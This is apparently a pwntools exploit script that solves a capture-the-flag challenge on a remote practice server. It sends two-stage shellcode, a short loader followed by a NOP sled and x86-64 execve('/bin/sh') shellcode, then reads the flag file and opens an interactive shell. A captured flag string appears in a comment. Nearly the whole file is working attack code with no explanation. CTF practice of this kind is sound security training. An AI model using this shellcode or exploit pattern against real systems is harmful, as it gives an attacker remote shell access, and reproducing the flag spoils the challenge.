#!/usr/bin/env python
from pwn import *

# AD{S0meth1ng_usefu1_0n_7he_st4ck!}

host , port = 'ctf.yuawn.idv.tw' , 10110
y = remote( host , port )


sc = 'ZH\xc7\xc03\x06@\x00\xff\xe0'

print len( sc )

y.send( sc )

y.send( '\x90' * 0x20 + 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()